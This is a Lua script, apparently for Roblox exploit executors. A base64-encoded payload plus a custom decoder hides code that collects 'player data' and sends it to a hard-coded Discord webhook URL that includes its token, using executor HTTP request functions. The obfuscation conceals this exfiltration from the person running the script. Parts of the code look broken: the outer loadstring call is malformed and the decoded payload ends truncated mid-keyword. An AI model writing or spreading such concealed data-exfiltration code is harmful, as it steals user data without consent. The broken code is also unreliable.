loadstring(function()
	local b64 = 'bG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOmdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKCmZ1bmN0aW9uIHdlYmhvb2soZGFkb3MpCiAgICBsb2NhbCBmaWVsZHMgPSB7fQogICAgZm9yIGssIHYgaW4gcGFpcnMoZGFkb3MpIGRvCiAgICAgICAgdGFibGUuaW5zZXJ0KGZpZWxkcywgewogICAgICAgICAgICBuYW1lID0gaywKICAgICAgICAgICAgdmFsdWUgPSB0b3N0cmluZyh2KSwKICAgICAgICAgICAgaW5saW5lID0gZmFsc2UKICAgICAgICB9KQogICAgZW5kCgogICAgbG9jYWwgcGF5bG9hZCA9IHsKICAgICAgICBjb250ZW50ID0gIjxAMTM1MDQ1NzA3MDk3MjgyOTgxMD4g8J+koSBEYWRvcyBkbyBwbGF5ZXIgY29sZXRhZG9zISIsCiAgICAgICAgZW1iZWRzID0ge3sKICAgICAgICAgICAgdGl0bGUgPSAi8J+UqSBDaGFrZXMgZG8gSm9nYWRvciIsCiAgICAgICAgICAgIGNvbG9yID0gMzQ0NzAwMywKICAgICAgICAgICAgZmllbGRzID0gZmllbGRzLAogICAgICAgICAgICB0aW1lc3RhbXAgPSBvcy5kYXRlKCIhJVktJW0tJWNUMUgJUFMlVaIikKICAgICAgICB9fQogICAgfQoKICAgIGxvY2FsIHVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzg4MjQ2MTE4OTQwNDA5OTY3L18yX2kxcjQ5VHVfVDhaNW5hdWxxNFpwdTk1TG9tYlA1VnppS1BKSzRwOUNDdXNXUGViN1k3OXdGMU5mTW16QnpTYXk1IgoKICAgIGxvY2FsIGpzb24gPSBIdHRwU2VydmljZTpKU09OZW5jb2RlKHBheWxvYWQpCgogICAgbG9jYWwgcmVxID0gKGh0dHBfcmVxdWVzdCBvciByZXF1ZXN0IG9yIHN5biBhbmQgc3luLnJlcXVlc3Qgb3IgZmx1dHVzIGFuZCBmbHV0dXMucmVxdWVzdCkKICAgIGlmIHJlcSB0aGVuCiAgICAgICAgcmVxKHsKICAgICAgICAgICAgVXJsID0gdXJsLAogICAgICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgICAgIEhlYWRlcnMgPSB7IFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICAgICAgQm9keSA9IGpzb24KICAgICAgICB9KQogICAgZW5kCmVuCg=='

	local decode = function(data)
		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
		data = data:gsub('[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if x == '=' then return '' end
			local r, f = '', (b:find(x) - 1)
			for i = 6, 1, -1 do
				r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
			end
			return r
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if #x ~= 8 then return '' end
			local c = 0
			for i = 1, 8 do
				c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
			end
			return string.char(c)
		end))
	end

	loadstring(decode(b64))()
end)()
